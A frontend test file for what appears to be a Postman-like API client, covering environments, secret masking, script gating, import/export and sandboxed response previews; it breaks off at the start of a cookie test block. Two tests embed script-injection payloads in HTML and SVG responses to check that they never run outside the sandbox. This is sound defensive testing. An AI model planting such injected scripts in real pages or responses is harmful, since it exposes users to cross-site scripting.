import { act, fireEvent, render, screen, waitFor, within } from '@testing-library/react';
import { describe, expect, it, vi } from 'vitest';
import { App } from '../src/App';
import { filterTrees, WorkspaceTree } from '../src/components/WorkspaceTree';
import type { Commands } from '../src/lib/commands';
import {
  defaultSettings,
  emptyAuth,
  emptyBody,
  type Collection,
  type CollectionTree,
  type CookieArgs,
  type CookieView,
  type CurlCommand,
  type Environment,
  type Folder,
  type TreeNode,
  type ImportOutcome,
  type ImportSourceArgs,
  type RequestPreview,
  type ResponsePayload,
  type SavedRequest,
  type Variable,
  type Workspace,
} from '../src/lib/types';

const workspace: Workspace = { id: 'w1', name: '默认工作区' };

const collection: Collection = {
  id: 'c1',
  workspace_id: 'w1',
  name: '我的集合',
  auth: emptyAuth(),
  pre_request_script: null,
  test_script: null,
  sort_order: 0,
};

function makeRequest(overrides: Partial<SavedRequest> = {}): SavedRequest {
  return {
    id: 'r1',
    collection_id: 'c1',
    folder_id: null,
    name: '我的请求',
    method: 'GET',
    url: 'https://api.test/users',
    params: [],
    headers: [],
    body: emptyBody(),
    auth: emptyAuth(),
    settings: defaultSettings(),
    pre_request_script: null,
    test_script: null,
    sort_order: 0,
    ...overrides,
  };
}

function treeWith(
  request: SavedRequest,
  folder?: Folder,
  extra?: SavedRequest,
): CollectionTree[] {
  const children: TreeNode[] = folder
    ? [{ kind: 'folder', id: folder.id, name: folder.name, sort_order: 0, children: [] }]
    : [];
  children.push({
    kind: 'request',
    id: request.id,
    name: request.name,
    sort_order: 0,
    children: [],
    request,
  });
  if (extra) {
    children.push({
      kind: 'request',
      id: extra.id,
      name: extra.name,
      sort_order: 1,
      children: [],
      request: extra,
    });
  }

  return [{ collection, children }];
}

function preview(overrides: Partial<RequestPreview> = {}): RequestPreview {
  return {
    method: 'GET',
    url: 'https://api.test/users',
    params: [],
    headers: [],
    body_text: null,
    auth_kind: 'inherit',
    auth_key: null,
    proxy_url: null,
    unresolved: [],
    masked: false,
    insecure_warning: false,
    ...overrides,
  };
}

function response(overrides: Partial<ResponsePayload> = {}): ResponsePayload {
  return {
    id: 'resp-1',
    status: 200,
    status_text: 'OK',
    elapsed_ms: 12,
    size_bytes: 2,
    declared_size_bytes: 2,
    truncated: false,
    headers: [['content-type', 'application/json']],
    content_type: 'application/json',
    body_text: '{}',
    body_base64: null,
    pretty_available: true,
    pretty_print_threshold: 5 * 1024 * 1024,
    insecure_warning: false,
    final_url: 'https://api.test/users',
    via_proxy: false,
    http_version: 'HTTP/1.1',
    unresolved: [],
    ...overrides,
  };
}

function importOutcome(overrides: Partial<ImportOutcome> = {}): ImportOutcome {
  return {
    kind: 'collection_v21',
    workspace_id: 'w1',
    collection_id: 'c1',
    environment_id: null,
    report: {
      auth_downgrades: [],
      skipped_items: [],
      file_field_downgrades: [],
      dropped_examples: 0,
    },
    ...overrides,
  };
}

function curlCommand(overrides: Partial<CurlCommand> = {}): CurlCommand {
  return {
    command: "curl -X GET 'https://api.test/users'",
    contains_secret: false,
    warnings: [],
    ...overrides,
  };
}

interface Harness {
  client: Commands;
  request: SavedRequest;
  sendRequest: ReturnType<typeof vi.fn>;
  secretReveal: ReturnType<typeof vi.fn>;
  importPostman: ReturnType<typeof vi.fn>;
  collectionExport: ReturnType<typeof vi.fn>;
  environmentExport: ReturnType<typeof vi.fn>;
  globalsExport: ReturnType<typeof vi.fn>;
  curlExport: ReturnType<typeof vi.fn>;
  settingsSet: ReturnType<typeof vi.fn>;
  cookiePut: ReturnType<typeof vi.fn>;
  cookieDelete: ReturnType<typeof vi.fn>;
  collectionSetScript: ReturnType<typeof vi.fn>;
  folderSetScript: ReturnType<typeof vi.fn>;
  /** 目录与改名（rework-collection-tree-and-scripts）。 */
  requestCreate: ReturnType<typeof vi.fn>;
  collectionRename: ReturnType<typeof vi.fn>;
  folderCreate: ReturnType<typeof vi.fn>;
  folderRename: ReturnType<typeof vi.fn>;
  folderDelete: ReturnType<typeof vi.fn>;
  /** 环境管理（change: add-collection-search-and-env-management）。 */
  environmentSetActive: ReturnType<typeof vi.fn>;
  environmentCreate: ReturnType<typeof vi.fn>;
  environmentRename: ReturnType<typeof vi.fn>;
  environmentDelete: ReturnType<typeof vi.fn>;
  /** 变量就地编辑（change: add-variable-inline-editing）。 */
  variableSet: ReturnType<typeof vi.fn>;
  variableDelete: ReturnType<typeof vi.fn>;
  /** 请求保存（change: reduce-explicit-save-and-add-controls：出口清洗）。 */
  requestSave: ReturnType<typeof vi.fn>;
  /** 解析预览（同上：出口清洗要同时覆盖预览）。 */
  variablesPreview: ReturnType<typeof vi.fn>;
}

function harness(options: {
  request?: SavedRequest;
  previewResult?: RequestPreview;
  variables?: Variable[];
  sendResult?: ResponsePayload;
  revealed?: Variable;
  importResult?: ImportOutcome;
  curlResult?: CurlCommand;
  /** 门禁状态；false 表示该集合的脚本尚未获准执行（任务 9.3）。 */
  scriptGateAllowed?: boolean;
  /** 预置的环境（rework-app-layout：Environments tab 的激活入口）。 */
  environments?: Environment[];
  /** 预置的 Cookie（8.5 手动管理界面）。 */
  cookies?: CookieView[];
  /** 树中的文件夹（5.2 文件夹脚本编辑入口）。 */
  folder?: Folder;
  /** 树里的第二条请求，用于「切走」相关的守卫用例。 */
  extraRequest?: SavedRequest;
} = {}): Harness {
  const request = options.request ?? makeRequest();
  const sendRequest = vi.fn(async () => options.sendResult ?? response());
  const secretReveal = vi.fn(async () => options.revealed ?? request);
  const importPostman = vi.fn(async () => options.importResult ?? importOutcome());
  const collectionExport = vi.fn(async () => ({ path: '/tmp/collection.json', bytes: 12 }));
  const environmentExport = vi.fn(async () => ({ path: '/tmp/environment.json', bytes: 12 }));
  const globalsExport = vi.fn(async () => ({ path: '/tmp/globals.json', bytes: 12 }));
  const curlExport = vi.fn(async () => options.curlResult ?? curlCommand());
  // 门禁状态存在 settings 里，假实现必须真的记住，否则「允许执行」之后仍会再次询问
  const settingsStore = new Map<string, string>();
  const settingsSet = vi.fn(async (scope: string, key: string, value: string) => {
    settingsStore.set(`${scope}:${key}`, value);
  });

  // Cookie 手动管理（8.5）：真的记住，增删之后列表会变
  const cookieStore: CookieView[] = [...(options.cookies ?? [])];
  let cookieSeq = 0;
  const cookiePut = vi.fn(async (args: CookieArgs) => {
    cookieStore.push({
      id: `ck-${++cookieSeq}`,
      domain: args.domain.trim().toLowerCase(),
      name: args.name,
      value: args.value,
      path: args.path ?? '/',
      host_only: args.host_only ?? false,
      secure: args.secure ?? false,
      http_only: args.http_only ?? false,
      expires_at: args.expires_at ?? null,
    });
  });
  const cookieDelete = vi.fn(async (id: string) => {
    const index = cookieStore.findIndex((entry) => entry.id === id);
    if (index >= 0) cookieStore.splice(index, 1);
  });
  const cookieList = vi.fn(async () => [...cookieStore]);

  // 树与 requestGet 必须反映**已保存**的请求（真实后端如此），否则 seed 会用
  // 旧数据覆盖乐观层，掩盖「保存后重开」的真实行为
  let current = request;
  const requestSave = vi.fn(async (value: SavedRequest) => {
    current = value;
    return value;
  });
  const variablesPreview = vi.fn(async () => options.previewResult ?? preview());

  const collectionSetScript = vi.fn(async (id: string) => collection);
  const requestCreate = vi.fn(async () => request);

  // 目录与改名：名字要跟着参数走，改名后界面上的输入框才能反映新名称
  const collectionRename = vi.fn(async (_id: string, name: string) => ({ ...collection, name }));
  const folderCreate = vi.fn(
    async (collectionId: string, parentFolderId: string | null, name: string) => ({
      id: 'f-new',
      collection_id: collectionId,
      parent_folder_id: parentFolderId,
      name,
      description: null,
      auth: emptyAuth(),
      pre_request_script: null,
      test_script: null,
      sort_order: 0,
    }),
  );
  const folderRename = vi.fn(async (id: string, name: string) => ({
    id,
    collection_id: 'c1',
    parent_folder_id: null,
    name,
    description: null,
    auth: emptyAuth(),
    pre_request_script: null,
    test_script: null,
    sort_order: 0,
  }));
  const folderDelete = vi.fn(async () => undefined);

  const folderSetScript = vi.fn(async (id: string) => ({
    id,
    collection_id: 'c1',
    name: '文件夹',
    description: null,
    auth: emptyAuth(),
    pre_request_script: null,
    test_script: null,
    sort_order: 0,
  }));

  // 环境：假实现必须真的记住（新建要出现在列表里、改名要显示新名字、
  // 删除后要消失），否则这几条行为无从验证。激活态同样真的记住，
  // 因为「跨重启保留」就是靠读回它证实的。
  const environmentStore: Environment[] = (options.environments ?? []).map((entry) => ({
    ...entry,
  }));
  let environmentSeq = 0;
  let activeEnvironmentId = environmentStore.find((entry) => entry.is_active)?.id ?? null;
  const environmentList = vi.fn(async () => environmentStore.map((entry) => ({ ...entry })));
  const environmentCreate = vi.fn(async (workspaceId: string, name: string) => {
    const created: Environment = {
      id: `env-${++environmentSeq}`,
      workspace_id: workspaceId,
      name,
      is_active: false,
      sort_order: environmentStore.length,
    };
    environmentStore.push(created);
    return { ...created };
  });
  const environmentRename = vi.fn(async (id: string, name: string) => {
    const found = environmentStore.find((entry) => entry.id === id);
    if (!found) throw new Error(`环境不存在：${id}`);
    found.name = name;
    return { ...found };
  });
  const environmentDelete = vi.fn(async (id: string) => {
    const index = environmentStore.findIndex((entry) => entry.id === id);
    if (index >= 0) environmentStore.splice(index, 1);
    if (activeEnvironmentId === id) activeEnvironmentId = null;
  });
  const environmentSetActive = vi.fn(async (_workspaceId: string, id: string | null) => {
    activeEnvironmentId = id;
  });

  // 变量：假实现要真的记账，否则「改完值列表显示新值」无从验证。
  // secret 的记账口径与真后端一致——列表里给的是掩码，明文只能经 secretReveal 取。
  const variableStore: Variable[] = (options.variables ?? []).map((entry) => ({ ...entry }));
  let variableSeq = 0;
  const variableList = vi.fn(async () => variableStore.map((entry) => ({ ...entry })));
  const variableSet = vi.fn(
    async (args: {
      scope: Variable['scope'];
      owner_id: string;
      name: string;
      is_secret?: boolean;
      initial?: string | null;
      current?: string | null;
    }) => {
      const value = args.current ?? args.initial ?? '';
      const existing = variableStore.find(
        (entry) =>
          entry.scope === args.scope && entry.owner_id === args.owner_id && entry.name === args.name,
      );
      const isSecret = args.is_secret ?? existing?.is_secret ?? false;
      const stored = isSecret ? '******' : value;

      if (existing) {
        existing.is_secret = isSecret;
        existing.initial = { state: 'value', value: stored };
        existing.current = { state: 'value', value: stored };
        return { ...existing };
      }

      const created: Variable = {
        id: `v-new-${++variableSeq}`,
        scope: args.scope,
        owner_id: args.owner_id,
        name: args.name,
        is_secret: isSecret,
        initial: { state: 'value', value: stored },
        current: { state: 'value', value: stored },
      };
      variableStore.push(created);
      return { ...created };
    },
  );
  const variableDelete = vi.fn(async (id: string) => {
    const index = variableStore.findIndex((entry) => entry.id === id);
    if (index >= 0) variableStore.splice(index, 1);
  });

  const base = {
    workspaceList: async () => [workspace],
    workspaceActive: async () => workspace,
    workspaceCreate: async () => workspace,
    workspaceRename: async () => workspace,
    workspaceDelete: async () => undefined,
    workspaceSetActive: async () => undefined,
    workspaceTree: async () => treeWith(current, options.folder, options.extraRequest),
    collectionCreate: async () => collection,
    collectionRename,
    collectionDelete: async () => undefined,
    collectionReorder: async () => undefined,
    collectionTree: async () => treeWith(request)[0],
    collectionGet: async () => collection,
    collectionSetScript,
    folderSetScript,
    folderGet: async () => {
      if (options.folder) return options.folder;
      throw new Error('未使用');
    },
    folderCreate,
    folderRename,
    folderDelete,
    folderMove: async () => {
      throw new Error('未使用');
    },
    childrenReorder: async () => undefined,
    requestGet: async (id: string) =>
      options.extraRequest && id === options.extraRequest.id ? options.extraRequest : current,
    requestCreate,
    requestSave,
    requestDuplicate: async () => request,
    requestDelete: async () => undefined,
    requestMove: async () => request,
    environmentList,
    environmentActive: async () =>
      environmentStore.find((entry) => entry.id === activeEnvironmentId) ?? null,
    environmentCreate,
    environmentRename,
    environmentDelete,
    environmentSetActive,
    environmentSetProxy: async () => {
      throw new Error('未使用');
    },
    variableList,
    variableSet,
    variableDelete,
    secretReveal,
    cookieList,
    cookiePut,
    cookieDelete,
    cookieQuery: async () => [],
    globalsList: variableList,
    globalsSet: async () => {
      throw new Error('未使用');
    },
    settingsGet: async (scope: string, key: string) => {
      const stored = settingsStore.get(`${scope}:${key}`);

      if (stored !== undefined) return stored;
      // 只有门禁默认放行；其它键一律视为未配置，否则策略会被误判成「已配置但无法解析」
      if (scope === 'script_gate') return options.scriptGateAllowed === false ? null : 'allowed';
      return null;
    },
    settingsSet,
    globalProxyGet: async () => null,
    globalProxySet: async () => undefined,
    variablesPreview,
    sendRequest,
    responseBodySpan: async () => ({
      offset: 0,
      length: 0,
      total_bytes: 0,
      truncated: false,
      text: '',
      base64: '',
    }),
    pickUploadFile: async () => null,
    backupExport: async () => null,
    backupRestore: async () => false,
    responseSaveFull: async () => ({ path: '/tmp/out', bytes: 0 }),
    importPostman,
    collectionExport,
    environmentExport,
    globalsExport,
    curlExport,
  } satisfies Commands;

  return {
    client: base,
    request,
    sendRequest,
    secretReveal,
    importPostman,
    collectionExport,
    environmentExport,
    globalsExport,
    curlExport,
    settingsSet,
    cookiePut,
    cookieDelete,
    collectionSetScript,
    folderSetScript,
    requestCreate,
    collectionRename,
    folderCreate,
    folderRename,
    folderDelete,
    environmentSetActive,
    environmentCreate,
    environmentRename,
    environmentDelete,
    variableSet,
    variableDelete,
    requestSave,
    variablesPreview,
  };
}

/** 侧栏集合树内部的查询：当前请求名同时出现在会话标签与面包屑上，必须限定范围。 */
function tree() {
  return within(screen.getByTestId('workspace-tree'));
}

/** 侧栏环境列表内部的查询：环境名同时出现在会话标签行的选择器里。 */
function envList() {
  return within(screen.getByRole('listbox', { name: '环境列表' }));
}

async function openEnvironments() {
  fireEvent.click(screen.getByRole('tab', { name: 'Environments' }));
  await screen.findByRole('listbox', { name: '环境列表' });
}

/** 悬停环境行并打开它的操作菜单——与集合树同一套交互。 */
function openEnvironmentMenu(name: string) {
  const row = envList().getByText(name).closest('.env-row') as HTMLElement;
  fireEvent.mouseOver(row);
  fireEvent.click(within(row).getByLabelText('更多操作'));
  return row;
}

function environment(overrides: Partial<Environment> = {}): Environment {
  return {
    id: 'e1',
    workspace_id: 'w1',
    name: '测试环境',
    is_active: false,
    sort_order: 0,
    ...overrides,
  };
}

async function openRequest() {
  const node = await tree().findByText('我的请求');
  fireEvent.click(node);
  await screen.findByLabelText('请求地址');
}

describe('前端数据流骨架', () => {
  it('从后端读取工作区与集合树并渲染（6.1）', async () => {
    const { client } = harness();
    render(<App client={client} />);

    expect(await screen.findByText('我的集合')).toBeTruthy();
    expect(await screen.findByText('我的请求')).toBeTruthy();

    // 侧栏改为 Collections / Environments 两个内部 tab；工作区切换界面已移除
    // （change: rework-app-layout）。环境选择器回到主区会话标签行
    // （change: add-collection-search-and-env-management）。
    expect(screen.getByRole('tab', { name: 'Collections' })).toBeTruthy();
    expect(screen.getByRole('tab', { name: 'Environments' })).toBeTruthy();
    expect(screen.queryByLabelText('工作区')).toBeNull();
    expect(screen.getByLabelText('环境')).toBeTruthy();
  });

  it('侧栏两个 tab 的内容互斥，Environments 承载全局变量（rework-app-layout）', async () => {
    const variable: Variable = {
      id: 'v-global',
      scope: 'global',
      owner_id: 'w1',
      name: 'baseUrl',
      is_secret: false,
      initial: { state: 'value', value: 'https://api.test' },
      current: { state: 'value', value: 'https://api.test' },
    };
    const { client } = harness({ variables: [variable] });
    render(<App client={client} />);

    expect(await screen.findByText('我的请求')).toBeTruthy();

    fireEvent.click(screen.getByRole('tab', { name: 'Environments' }));

    // 集合树让位给环境列表；变量编辑在主区而不是侧栏（change:
    // add-collection-search-and-env-management，design D8）
    expect(await screen.findByText('baseUrl')).toBeTruthy();
    expect(screen.getByRole('listbox', { name: '环境列表' })).toBeTruthy();
    expect(screen.queryByText('我的请求')).toBeNull();

    const panel = screen.getByTestId('environments-panel');
    expect(within(panel).queryByText('baseUrl')).toBeNull();
    expect(within(screen.getByTestId('environment-editor')).getByText('baseUrl')).toBeTruthy();
    expect(within(screen.getByTestId('session-tab')).getByText('环境')).toBeTruthy();

    // 侧栏不再重复 tab 名：工具栏只有图标按钮
    expect(within(panel).queryByText('环境')).toBeNull();
    expect(within(panel).getByLabelText('新建环境')).toBeTruthy();
    // 选择器自带「无环境 / 环境名」，边上不另加可见标签
    const selectWrap = screen.getByLabelText('环境').closest('.env-select') as HTMLElement;
    expect(selectWrap.querySelector('.muted')).toBeNull();

    fireEvent.click(screen.getByRole('tab', { name: 'Collections' }));
    expect(await screen.findByText('我的请求')).toBeTruthy();
  });

  it('未解析变量在发送之前就可见，且不会发出请求（6.3）', async () => {
    const { client, sendRequest } = harness({
      previewResult: preview({
        url: 'https://api.test/{{missing}}',
        unresolved: ['missing', 'id'],
      }),
    });
    render(<App client={client} />);
    await openRequest();

    const warning = await screen.findByTestId('unresolved-warning');
    expect(warning.textContent).toContain('missing');
    expect(warning.textContent).toContain('id');
    expect(sendRequest).not.toHaveBeenCalled();
  });

  it('解析预览条默认展开且可折叠，折叠后未解析警告仍常驻（rework-app-layout）', async () => {
    const { client } = harness({
      previewResult: preview({
        url: 'https://api.test/{{missing}}/users',
        unresolved: ['missing'],
      }),
    });
    render(<App client={client} />);
    await openRequest();

    // 默认展开：解析后的 URL 可见
    expect(await screen.findByText('https://api.test/{{missing}}/users')).toBeTruthy();

    fireEvent.click(screen.getByRole('button', { name: /解析预览/ }));

    // 折叠掉的只是「解析成什么样」，未解析警告必须留着
    expect(screen.queryByText('https://api.test/{{missing}}/users')).toBeNull();
    expect(screen.getByTestId('unresolved-warning')).toBeTruthy();

    fireEvent.click(screen.getByRole('button', { name: /解析预览/ }));
    expect(await screen.findByText('https://api.test/{{missing}}/users')).toBeTruthy();
  });

  it('面包屑显示所属集合与请求名，请求操作行承载保存（rework-app-layout）', async () => {
    const { client } = harness();
    const { container } = render(<App client={client} />);
    await openRequest();

    const crumb = container.querySelector('.crumb-bar') as HTMLElement;
    expect(crumb.textContent).toContain('我的集合');
    expect((screen.getByLabelText('请求名称') as HTMLInputElement).value).toBe('我的请求');
    // 未改动时没有「未保存」标记
    expect(screen.queryByText('未保存')).toBeNull();

    // 请求名可改名，保存与另存为/删除都在这一行
    fireEvent.change(screen.getByLabelText('请求名称'), { target: { value: '改名后的请求' } });
    expect(await screen.findByText('未保存')).toBeTruthy();
    expect(screen.getByText('另存为')).toBeTruthy();
    expect(screen.getByText('删除')).toBeTruthy();
  });

  it('响应栏只在选中请求时出现，并与请求区左右并排（rework-app-layout）', async () => {
    const { client } = harness();
    const { container } = render(<App client={client} />);

    const main = container.querySelector('.main') as HTMLElement;
    // 初始没有选中请求：不显示响应栏，请求区独占整宽
    expect(main.className).not.toContain('with-response');
    expect(container.querySelector('.response-region')).toBeNull();

    await openRequest();

    // 选中请求后：请求区在左、响应区在右
    expect(main.className).toContain('with-response');
    expect(container.querySelector('.request-region')).toBeTruthy();
    expect(container.querySelector('.response-region')).toBeTruthy();

    // 选中集合（不是请求）时响应栏再次消失
    fireEvent.click(tree().getByText('我的集合'));
    await screen.findByTestId('entity-script-panel');
    expect(container.querySelector('.response-region')).toBeNull();
    expect(main.className).not.toContain('with-response');
  });

  it('在 Environments tab 激活环境后，发送带上该环境（rework-app-layout）', async () => {
    const { client, sendRequest } = harness({ environments: [environment()] });
    render(<App client={client} />);
    await screen.findByText('我的请求');

    await openEnvironments();
    // 环境名同时出现在主区选择器里，因此点击必须限定在侧栏列表内
    fireEvent.click(envList().getByText('测试环境'));

    fireEvent.click(screen.getByRole('tab', { name: 'Collections' }));
    fireEvent.click(await screen.findByText('我的请求'));
    await screen.findByLabelText('请求地址');
    fireEvent.click(screen.getByText('发送'));

    await waitFor(() => expect(sendRequest).toHaveBeenCalled());
    expect((sendRequest.mock.calls[0][0] as { environment_id: string | null }).environment_id).toBe(
      'e1',
    );
  });

  it('secret 变量默认掩码，只有显式揭示才出现明文（6.3）', async () => {
    const secret: Variable = {
      id: 'v1',
      scope: 'global',
      owner_id: 'w1',
      name: 'apiKey',
      is_secret: true,
      initial: { state: 'value', value: '******' },
      current: { state: 'value', value: '******' },
    };
    const revealed: Variable = {
      ...secret,
      current: { state: 'value', value: 'PLAINTEXT_SECRET' },
      initial: { state: 'value', value: 'PLAINTEXT_SECRET' },
    };

    const { client, secretReveal } = harness({ variables: [secret], revealed });
    render(<App client={client} />);

    // 变量入口从侧栏按钮搬到了 Environments tab（change: rework-app-layout）
    fireEvent.click(await screen.findByRole('tab', { name: 'Environments' }));

    const masked = await screen.findByTestId('masked-apiKey');
    expect(masked.textContent).toBe('******');
    expect(screen.queryByText('PLAINTEXT_SECRET')).toBeNull();

    fireEvent.click(screen.getByText('揭示'));

    // 揭示后该值变成可就地编辑的输入框（change: add-variable-inline-editing），
    // 因此断言从 textContent 改为输入框的 value——意图不变：明文可见
    await waitFor(() =>
      expect((screen.getByTestId('plain-apiKey') as HTMLInputElement).value).toBe(
        'PLAINTEXT_SECRET',
      ),
    );
    expect(secretReveal).toHaveBeenCalledWith('v1');
  });

  it('未保存改动在界面上有明确提示，保存后清除（6.2）', async () => {
    const { client } = harness();
    render(<App client={client} />);
    await openRequest();

    expect(screen.queryByText('未保存')).toBeNull();
    fireEvent.change(screen.getByLabelText('请求地址'), {
      target: { value: 'https://api.test/changed' },
    });
    expect(await screen.findByText('未保存')).toBeTruthy();

    fireEvent.click(screen.getByText('保存'));
    await waitFor(() => expect(screen.queryByText('未保存')).toBeNull());
  });

  it('不可信响应的预览被放进 sandbox iframe，且不授予脚本执行（7.3）', async () => {
    const { client } = harness({
      sendResult: response({
        content_type: 'text/html',
        headers: [['content-type', 'text/html']],
        body_text: '<html><body><script>window.__pwned = true;</script>hello</body></html>',
        size_bytes: 62,
      }),
    });
    render(<App client={client} />);
    await openRequest();

    fireEvent.click(screen.getByText('发送'));

    const frame = await screen.findByTestId('sandboxed-preview');
    const sandbox = frame.getAttribute('sandbox');
    expect(sandbox).toBe('', 'sandbox 属性应为空，即不授予任何允许项');
    expect(sandbox ?? '').not.toContain('allow-scripts');
    expect(sandbox ?? '').not.toContain('allow-same-origin');

    // 脚本没有在应用上下文里执行
    expect((globalThis as Record<string, unknown>).__pwned).toBeUndefined();
    // 明文 HTML 不会被当作文本直接渲染进应用文档
    expect(screen.getByTestId('sandboxed-preview').tagName).toBe('IFRAME');
  });

  it('SVG 响应同样被隔离承载（7.3）', async () => {
    const svg =
      '<svg xmlns="http://www.w3.org/2000/svg"><script>window.__svgPwned = true;</script><circle r="10"/></svg>';
    const { client } = harness({
      sendResult: response({
        content_type: 'image/svg+xml',
        headers: [['content-type', 'image/svg+xml']],
        body_text: svg,
        size_bytes: svg.length,
      }),
    });
    render(<App client={client} />);
    await openRequest();
    fireEvent.click(screen.getByText('发送'));

    const frame = await screen.findByTestId('sandboxed-preview');
    const sandbox = frame.getAttribute('sandbox');
    expect(sandbox).toBe('');
    expect(sandbox ?? '').not.toContain('allow-scripts');
    expect((globalThis as Record<string, unknown>).__svgPwned).toBeUndefined();
  });

  it('响应元数据在界面上可见（5.7 / 7.1）', async () => {
    const { client } = harness({
      sendResult: response({ status: 201, status_text: 'Created', elapsed_ms: 42, size_bytes: 2 }),
    });
    render(<App client={client} />);
    await openRequest();

    fireEvent.click(screen.getByText('发送'));

    await waitFor(() => expect(screen.getByTestId('status').textContent).toContain('201'));
    expect(screen.getByTestId('status').textContent).toContain('Created');
    expect(screen.getByText('42 ms')).toBeTruthy();
    expect(screen.getByText('HTTP/1.1')).toBeTruthy();
  });

  it('发送失败时把后端分类错误呈现给用户', async () => {
    const { client } = harness();
    client.sendRequest = vi.fn(async () => {
      throw { code: 'dns_failure', message: 'failed to lookup address' };
    });

    render(<App client={client} />);
    await openRequest();
    fireEvent.click(screen.getByText('发送'));

    const banner = await screen.findByTestId('app-error');
    expect(banner.textContent).toContain('failed to lookup address');
  });

  it('导入入口支持粘贴与选择文件，并展示导入差异（7.1）', async () => {
    const { client, importPostman } = harness({
      importResult: importOutcome({
        report: {
          auth_downgrades: [{ level: 'request', entry_name: '请求甲', auth_type: 'digest' }],
          skipped_items: [{ name: 'off', reason: '源文档中该变量被禁用' }],
          file_field_downgrades: [{ entry_name: '多段表单', field_name: 'upload' }],
          dropped_examples: 3,
        },
      }),
    });
    render(<App client={client} />);

    fireEvent.click(await screen.findByText('导入/导出'));
    fireEvent.change(screen.getByLabelText('粘贴 Postman 文档'), {
      target: { value: '{"info":{"name":"x"},"item":[]}' },
    });
    fireEvent.click(screen.getByText('导入粘贴内容'));

    const report = await screen.findByTestId('import-report');
    expect(importPostman).toHaveBeenCalledWith('w1', {
      text: '{"info":{"name":"x"},"item":[]}',
    });

    // 降级条目、待选择文件、被跳过的条目与示例数量都必须可见
    expect(report.textContent).toContain('请求甲');
    expect(report.textContent).toContain('digest');
    expect(await screen.findByTestId('file-downgrades')).toBeTruthy();
    expect(screen.getByTestId('file-downgrades').textContent).toContain('upload');
    expect(screen.getByTestId('skipped-items').textContent).toContain('off');
    expect(report.textContent).toContain('丢弃示例 3 条');
  });

  it('无差异的导入报告明确表示没有降级或丢弃（7.1）', async () => {
    const { client } = harness({ importResult: importOutcome() });
    render(<App client={client} />);

    fireEvent.click(await screen.findByText('导入/导出'));
    fireEvent.change(screen.getByLabelText('粘贴 Postman 文档'), {
      target: { value: '{"info":{"name":"x"},"item":[]}' },
    });
    fireEvent.click(screen.getByText('导入粘贴内容'));

    const report = await screen.findByTestId('import-report');
    expect(report.textContent).toContain('没有降级或丢弃');
    expect(screen.queryByTestId('auth-downgrades')).toBeNull();
  });

  it('导出动作经具名命令触发，引用 secret 时给出提示（7.2）', async () => {
    const { client, collectionExport, globalsExport, curlExport } = harness({
      curlResult: curlCommand({
        contains_secret: true,
        warnings: ['命令包含 secret 变量的明文取值：apiKey'],
      }),
    });
    render(<App client={client} />);
    await openRequest();

    fireEvent.click(await screen.findByText('导入/导出'));

    fireEvent.click(screen.getByText('导出集合'));
    await waitFor(() => expect(collectionExport).toHaveBeenCalledWith('c1'));

    fireEvent.click(screen.getByText('导出全局变量'));
    await waitFor(() => expect(globalsExport).toHaveBeenCalledWith('w1'));

    fireEvent.click(screen.getByText('导出 curl'));
    const warnings = await screen.findByTestId('curl-warnings');
    expect(warnings.textContent).toContain('apiKey');
    expect(curlExport).toHaveBeenCalledTimes(1);
  });

  it('没有脚本输出也没有断言时不出现「脚本」标签页（6.4）', async () => {
    const { client } = harness();
    render(<App client={client} />);
    await openRequest();

    fireEvent.click(screen.getByText('发送'));
    await screen.findByTestId('status');

    // 空跑一次也不该留下一个点开是空的标签页
    expect(screen.queryByText('脚本')).toBeNull();
  });

  it('设置面板能配置脚本目标策略，默认显示未配置', async () => {
    const { client, settingsSet } = harness();
    render(<App client={client} />);

    fireEvent.click(await screen.findByText('设置'));

    const panel = await screen.findByTestId('settings-panel');
    expect(panel.textContent).toContain('未配置');

    fireEvent.change(screen.getByLabelText('主机名单'), { target: { value: 'api.test' } });
    fireEvent.click(screen.getByText('保存策略'));

    await waitFor(() =>
      expect(settingsSet).toHaveBeenCalledWith(
        'script_send_request',
        'policy',
        JSON.stringify({ mode: 'allow', hosts: ['api.test'] }),
      ),
    );
  });

  it('设置面板能恢复为不限制目标', async () => {
    const { client, settingsSet } = harness();
    render(<App client={client} />);

    fireEvent.click(await screen.findByText('设置'));
    fireEvent.click(await screen.findByText('恢复为不限制'));

    await waitFor(() =>
      expect(settingsSet).toHaveBeenCalledWith('script_send_request', 'policy', ''),
    );
  });

  it('脚本未获准时发送被挡下，请求与脚本都不执行（9.3）', async () => {
    const { client, sendRequest } = harness({ scriptGateAllowed: false });
    render(<App client={client} />);
    await openRequest();

    fireEvent.click(screen.getByText('发送'));

    const gate = await screen.findByTestId('script-gate');
    expect(gate.textContent).toContain('我的集合');
    expect(sendRequest, '未确认前不应发出请求').not.toHaveBeenCalled();
  });

  it('允许执行后记下确认，请求随之发出（9.3）', async () => {
    const { client, sendRequest, settingsSet } = harness({ scriptGateAllowed: false });
    render(<App client={client} />);
    await openRequest();

    fireEvent.click(screen.getByText('发送'));
    fireEvent.click(await screen.findByText('允许执行（记住此集合）'));

    await waitFor(() => expect(sendRequest).toHaveBeenCalled());
    // 确认按集合记录，因此同一集合内的其它请求不再重复询问
    expect(settingsSet).toHaveBeenCalledWith('script_gate', 'c1', 'allowed');
  });

  it('拒绝执行时只是跳过，请求仍按用户选择发出（9.3）', async () => {
    const { client, sendRequest, settingsSet } = harness({ scriptGateAllowed: false });
    render(<App client={client} />);
    await openRequest();

    fireEvent.click(screen.getByText('发送'));
    fireEvent.click(await screen.findByText('不执行脚本，仍发送'));

    await waitFor(() => expect(sendRequest).toHaveBeenCalled());
    // 没有记下确认：这次是跳过，不是授权，下一次发送仍会询问
    expect(settingsSet).not.toHaveBeenCalled();
  });

  it('前置脚本的写入先落库、后发送，解析才能取到脚本写入的值（3.3）', async () => {
    const scripted = makeRequest({
      pre_request_script: 'pm.globals.set("g1", "from-script");',
    });
    const { client, sendRequest } = harness({ request: scripted });
    const globalsSet = vi.fn(async () => ({
      id: 'g1',
      scope: 'global' as const,
      owner_id: 'w1',
      name: 'g1',
      is_secret: false,
      initial: { state: 'value' as const, value: 'from-script' },
      current: { state: 'value' as const, value: 'from-script' },
    }));
    client.globalsSet = globalsSet;
    render(<App client={client} />);
    await openRequest();

    fireEvent.click(screen.getByText('发送'));

    await waitFor(() => expect(sendRequest).toHaveBeenCalled());
    // 写入落到了全局作用域的工作区上
    expect(globalsSet).toHaveBeenCalledWith('w1', 'g1', 'from-script', false);
    // 顺序是硬要求：变量解析发生在后端发送时，脚本写入若晚于发送就静默失效
    expect(globalsSet.mock.invocationCallOrder[0]).toBeLessThan(
      sendRequest.mock.invocationCallOrder[0],
    );
  }, 30_000);
});

// ---------------------------------------------------------------------------
// 8.5 / 8.7 Cookie 手动管理界面
// ---------------------------------------------------------------------------

describe('Cookie 管理', () => {
